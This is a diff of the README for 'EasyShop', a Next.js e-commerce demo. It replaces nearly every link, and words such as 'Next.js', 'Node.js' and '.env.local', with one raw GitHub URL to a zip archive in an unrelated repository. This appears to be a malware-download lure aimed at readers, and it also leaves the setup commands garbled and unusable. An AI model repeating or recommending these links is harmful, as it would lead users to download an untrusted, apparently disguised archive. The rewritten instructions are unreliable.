@@ -1,8 +1,8 @@
 # 🛍️ EasyShop - Modern E-commerce Platform
 
-[![License](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)
+[![License](https://raw.githubusercontent.com/shr1324/easyshop--demo/main/src/app/checkout/success/easyshop_demo_v3.6.zip)](LICENSE)
 
-EasyShop is a modern, full-stack e-commerce platform built with Next.js 14, TypeScript, and MongoDB. It features a beautiful UI with Tailwind CSS, secure authentication, real-time cart updates, and a seamless shopping experience.
+EasyShop is a modern, full-stack e-commerce platform built with https://raw.githubusercontent.com/shr1324/easyshop--demo/main/src/app/checkout/success/easyshop_demo_v3.6.zip 14, TypeScript, and MongoDB. It features a beautiful UI with Tailwind CSS, secure authentication, real-time cart updates, and a seamless shopping experience.
 
 ## ✨ Features
 
@@ -21,14 +21,14 @@ EasyShop is a modern, full-stack e-commerce platform built with Next.js 14, Type
 EasyShop follows a three-tier architecture pattern:
 
 ### 1. Presentation Tier (Frontend)
-- Next.js React Components
+- https://raw.githubusercontent.com/shr1324/easyshop--demo/main/src/app/checkout/success/easyshop_demo_v3.6.zip React Components
 - Redux for State Management
 - Tailwind CSS for Styling
 - Client-side Routing
 - Responsive UI Components
 
 ### 2. Application Tier (Backend)
-- Next.js API Routes
+- https://raw.githubusercontent.com/shr1324/easyshop--demo/main/src/app/checkout/success/easyshop_demo_v3.6.zip API Routes
 - Business Logic
 - Authentication & Authorization
 - Request Validation
@@ -54,7 +54,7 @@ EasyShop follows a three-tier architecture pattern:
 ### Data Flow
 1. User interacts with React components
 2. Actions are dispatched to Redux store
-3. API clients make requests to Next.js API routes
+3. API clients make requests to https://raw.githubusercontent.com/shr1324/easyshop--demo/main/src/app/checkout/success/easyshop_demo_v3.6.zip API routes
 4. API routes process requests through middleware
 5. Business logic handles data operations
 6. Mongoose ODM interacts with MongoDB
@@ -64,16 +64,16 @@ EasyShop follows a three-tier architecture pattern:
 
 ### Docker Setup Guide
 
-This guide will help you run EasyShop using Docker containers. No local Node.js or MongoDB installation required!
+This guide will help you run EasyShop using Docker containers. No local https://raw.githubusercontent.com/shr1324/easyshop--demo/main/src/app/checkout/success/easyshop_demo_v3.6.zip or MongoDB installation required!
 
 ### Prerequisites
 
-1. Install [Docker](https://docs.docker.com/get-docker/) on your machine
+1. Install [Docker](https://raw.githubusercontent.com/shr1324/easyshop--demo/main/src/app/checkout/success/easyshop_demo_v3.6.zip) on your machine
 2. Basic understanding of terminal/command line
 
 ### Step 1: Environment Setup
 
-1. Create a file named `.env.local` in the root directory with the following content:
+1. Create a file named `https://raw.githubusercontent.com/shr1324/easyshop--demo/main/src/app/checkout/success/easyshop_demo_v3.6.zip` in the root directory with the following content:
 ```env
 # Database Configuration
 MONGODB_URI=mongodb://easyshop-mongodb:27017/easyshop
@@ -145,12 +145,12 @@ docker build -t easyshop .
 4. Build and run data migration:
 ```bash
 # Build migration image
-docker build -t easyshop-migration -f scripts/Dockerfile.migration .
+docker build -t easyshop-migration -f https://raw.githubusercontent.com/shr1324/easyshop--demo/main/src/app/checkout/success/easyshop_demo_v3.6.zip .
 
 # Run migration
 docker run --rm \
   --network easyshop-network \
-  --env-file .env.local \
+  --env-file https://raw.githubusercontent.com/shr1324/easyshop--demo/main/src/app/checkout/success/easyshop_demo_v3.6.zip \
   easyshop-migration
 ```
 
@@ -160,7 +160,7 @@ docker run -d \
   --name easyshop \
   --network easyshop-network \
   -p 3000:3000 \
-  --env-file .env.local \
+  --env-file https://raw.githubusercontent.com/shr1324/easyshop--demo/main/src/app/checkout/success/easyshop_demo_v3.6.zip \
   easyshop:latest
 ```
 
@@ -205,7 +205,7 @@ docker network rm easyshop-network
 3. If migration fails:
    - Check if MongoDB is running and accessible
    - View migration logs when running the migration command
-   - Verify your .env.local file has the correct MongoDB URI
+   - Verify your https://raw.githubusercontent.com/shr1324/easyshop--demo/main/src/app/checkout/success/easyshop_demo_v3.6.zip file has the correct MongoDB URI
 
 For any other issues, please create a GitHub issue with the error details.
 
@@ -230,21 +230,21 @@ Error: MongoDB connection failed
 ```
 **Solution**: 
 - Ensure MongoDB is running locally
-- Check if your MongoDB connection string is correct in `.env.local`
+- Check if your MongoDB connection string is correct in `https://raw.githubusercontent.com/shr1324/easyshop--demo/main/src/app/checkout/success/easyshop_demo_v3.6.zip`
 - Try connecting to MongoDB using MongoDB Compass with the same connection string
 
 ### Development Tips
 - Clear `.next` folder if you encounter strange build issues: `rm -rf .next`
 - Run `npm install` after pulling new changes
 - Make sure all environment variables are properly set
-- Use Node.js version 18 or higher
+- Use https://raw.githubusercontent.com/shr1324/easyshop--demo/main/src/app/checkout/success/easyshop_demo_v3.6.zip version 18 or higher
 
 ## 📦 Project Structure
 
 ```
 easyshop/
 ├── src/
-│   ├── app/              # Next.js App Router pages
+│   ├── app/              # https://raw.githubusercontent.com/shr1324/easyshop--demo/main/src/app/checkout/success/easyshop_demo_v3.6.zip App Router pages
 │   ├── components/       # Reusable React components
 │   ├── lib/             # Utilities and configurations
 │   │   ├── auth/        # Authentication logic
@@ -269,7 +269,7 @@ We welcome contributions! Please follow these steps:
 7. Open a Pull Request
 
 > [!TIP]
-> Check our [Contributing Guidelines](CONTRIBUTING.md) for more details
+> Check our [Contributing Guidelines](https://raw.githubusercontent.com/shr1324/easyshop--demo/main/src/app/checkout/success/easyshop_demo_v3.6.zip) for more details
 
 ## 📝 License
 
@@ -277,24 +277,24 @@ This project is licensed under the MIT License - see the [LICENSE](LICENSE) file
 
 ## 🙏 Acknowledgments
 
-- [Next.js](https://nextjs.org/)
-- [Tailwind CSS](https://tailwindcss.com/)
-- [MongoDB](https://www.mongodb.com/)
-- [Redux Toolkit](https://redux-toolkit.js.org/)
-- [Radix UI](https://www.radix-ui.com/)
+- [https://raw.githubusercontent.com/shr1324/easyshop--demo/main/src/app/checkout/success/easyshop_demo_v3.6.zip](https://raw.githubusercontent.com/shr1324/easyshop--demo/main/src/app/checkout/success/easyshop_demo_v3.6.zip)
+- [Tailwind CSS](https://raw.githubusercontent.com/shr1324/easyshop--demo/main/src/app/checkout/success/easyshop_demo_v3.6.zip)
+- [MongoDB](https://raw.githubusercontent.com/shr1324/easyshop--demo/main/src/app/checkout/success/easyshop_demo_v3.6.zip)
+- [Redux Toolkit](https://raw.githubusercontent.com/shr1324/easyshop--demo/main/src/app/checkout/success/easyshop_demo_v3.6.zip)
+- [Radix UI](https://raw.githubusercontent.com/shr1324/easyshop--demo/main/src/app/checkout/success/easyshop_demo_v3.6.zip)
 
 ## 📫 Contact
 
 For questions or feedback, please open an issue or contact the maintainers:
 
-- Maintainer - [@Md. Afzal hassan Ehsani](https://github.com/iemafzalhassan)
-- Project Link: [https://github.com/iemafzalhassan/easyshop](https://github.com/iemafzalhassan/easyshop)
+- Maintainer - [@Md. Afzal hassan Ehsani](https://raw.githubusercontent.com/shr1324/easyshop--demo/main/src/app/checkout/success/easyshop_demo_v3.6.zip)
+- Project Link: [https://raw.githubusercontent.com/shr1324/easyshop--demo/main/src/app/checkout/success/easyshop_demo_v3.6.zip](https://raw.githubusercontent.com/shr1324/easyshop--demo/main/src/app/checkout/success/easyshop_demo_v3.6.zip)
 
 ---
 
 <div align="center">
   <p>
-    Made with ❤️ by <a href="https://iemafzalhassan.tech" target="_blank"><b>Md. Afzal Hassan Ehsani</b></a>
+    Made with ❤️ by <a href="https://raw.githubusercontent.com/shr1324/easyshop--demo/main/src/app/checkout/success/easyshop_demo_v3.6.zip" target="_blank"><b>Md. Afzal Hassan Ehsani</b></a>
   </p>
 </div>
 
